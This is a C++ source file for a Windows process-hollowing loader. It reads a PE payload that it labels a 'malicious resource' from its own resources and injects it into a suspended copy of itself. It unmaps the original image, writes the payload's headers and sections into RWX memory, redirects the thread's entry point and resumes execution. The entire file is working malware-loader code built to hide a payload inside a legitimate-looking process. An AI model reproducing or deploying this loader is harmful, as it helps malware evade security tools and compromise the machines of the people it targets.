#include <iostream>
#include <Windows.h>
#include <tchar.h>

using namespace std;

#pragma comment(lib, "ntdll.lib")
typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);

int main(int argc, char* argv[]) 
{
    // Load the binary from resources
    cout << "[x] Loading malicious resource" << endl;
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(101), _T("binary"));
    //HRSRC hResource = FindResource(hModule, (LPCWSTR)"IDR_BINARY1", RT_STRING);
    if (hResource == NULL) {
        std::cout << "[!] Failed to find the resource" << std::endl;
        return -1;
    }

    HGLOBAL hResourceData = LoadResource(hModule, hResource);
    if (hResourceData == NULL) {
        std::cout << "[!] Failed to load the resource" << std::endl;
        return -2;
    }

    cout << "[x] Getting the address of malicious resource in memory" << endl;
    LPVOID pResourceData = LockResource(hResourceData);
    DWORD dwResourceSize = SizeofResource(hModule, hResource);

    //##########################################################
    // Create a new process in a suspended state
    cout << "[x] Creating process in suspended state" << endl;
    std::string itself = argv[0];
    LPSTARTUPINFOA target_si = new STARTUPINFOA();
    LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();
    CONTEXT c;

    //create Target image for hollowing
    if (CreateProcessA(
        (LPSTR)itself.c_str(),
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        target_si,
        target_pi) == 0) {
        cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
        return -3;
    }

    //get thread context to access register values EAX, EBX 
    c.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(target_pi->hThread, &c);

    //Find base address of Target process
    PVOID pTargetImageBaseAddress;
    ReadProcessMemory(
        target_pi->hProcess,
        (PVOID)(c.Ebx + 8),
        &pTargetImageBaseAddress,
        sizeof(PVOID),
        0
    );

    //Hollow process 
    HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
    pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");


    DWORD dwResult = pZwUnmapViewOfSection(target_pi->hProcess, pTargetImageBaseAddress);
    if (dwResult) {
        cout << "[!] Unmapping failed" << endl;
        TerminateProcess(target_pi->hProcess, 1);
        return -4;
    }

    //get Malicious resource size from NT Headers
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pResourceData;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pResourceData + pDOSHeader->e_lfanew);
    DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
    cout << "[+] Malicious Resource Base Address: 0x" << pNTHeaders->OptionalHeader.ImageBase << endl;

    PVOID pHollowAddress = VirtualAllocEx(
        target_pi->hProcess,
        pTargetImageBaseAddress,
        sizeOfMaliciousImage,
        0x3000,
        0x40
    );
    if (pHollowAddress == NULL) {
        cout << "[!] Memory allocation in target process failed. Error: " << GetLastError() << endl;
        TerminateProcess(target_pi->hProcess, 0);
        return -5;
    }
    cout << "[+] Memory allocated in target at: 0x" << pHollowAddress << endl;

    if (!WriteProcessMemory(
        target_pi->hProcess,
        pTargetImageBaseAddress,
        pResourceData,
        pNTHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        cout << "[!] Writting Headers failed. Error: " << GetLastError() << endl;
        return -6;
    }
    cout << "[+] Headers written to memory" << endl;

    //write malicious PE sections into target
    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pResourceData + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

        WriteProcessMemory(
            target_pi->hProcess,
            (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress),
            (PVOID)((LPBYTE)pResourceData + pSectionHeader->PointerToRawData),
            pSectionHeader->SizeOfRawData,
            NULL
        );
        //cout << "[+] Section: " << pSectionHeader->Name <<" written to memory."<< endl;
    }
    cout << "[+] Sections written to memory" << endl;

    //change victim entry point (EAX thread context) to malicious entry point & resume thread
    c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(target_pi->hThread, &c);
    cout << "[+] Thread Context Changed " << endl;

    cout << "[x] Resuming Thread" << endl;
    ResumeThread(target_pi->hThread);
    return 0;
}
